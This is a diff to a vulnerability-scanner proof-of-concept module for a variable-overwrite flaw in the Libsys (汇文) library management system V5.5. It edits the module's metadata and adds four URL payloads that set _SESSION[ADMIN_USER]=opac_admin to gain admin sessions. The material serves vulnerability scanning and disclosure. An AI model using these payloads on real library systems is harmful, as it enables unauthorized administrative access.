@@ -5,18 +5,23 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import datetime
 
 class Vuln(ABVuln):
-    vuln_id = 'libsys_0005' # 平台漏洞编号，留空
-    name = 'Libsys图书管理系统 V5.5 变量覆盖漏洞'  # 漏洞名称
+    vuln_id = 'Libsys_0005' # 平台漏洞编号，留空
+    name = '汇文图书管理系统 变量覆盖'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
     type = VulnType.OTHER # 漏洞类型
     disclosure_date = '2015-08-15'  # 漏洞公布时间
     desc = '''
+        汇文（Libsys）图书管理系统存在变量覆盖漏洞。
+        /recm/common.php?_SESSION[ADMIN_USER]=opac_admin
+        /opac/openlink_ebk.php?_SESSION[ADMIN_USER]=opac_admin
+        /opac/ajax_ebook.php?_SESSION[ADMIN_USER]=opac_admin
+        /top/top_custom.php?_SESSION[ADMIN_USER]=opac_admin
     '''  # 漏洞描述
     ref = 'https://www.seebug.org/vuldb/ssvid-90722'  # 漏洞来源
     cnvd_id = ''  # cnvd漏洞编号
     cve_id = ''  # cve编号
-    product = 'Libsys图书管理系统'  # 漏洞应用名称
-    product_version = 'V5.5'  # 漏洞应用版本
+    product = '汇文软件'  # 漏洞应用名称
+    product_version = '汇文图书管理系统V5.5'  # 漏洞应用版本
 
 def testing(url):
     hh = hackhttp.hackhttp()
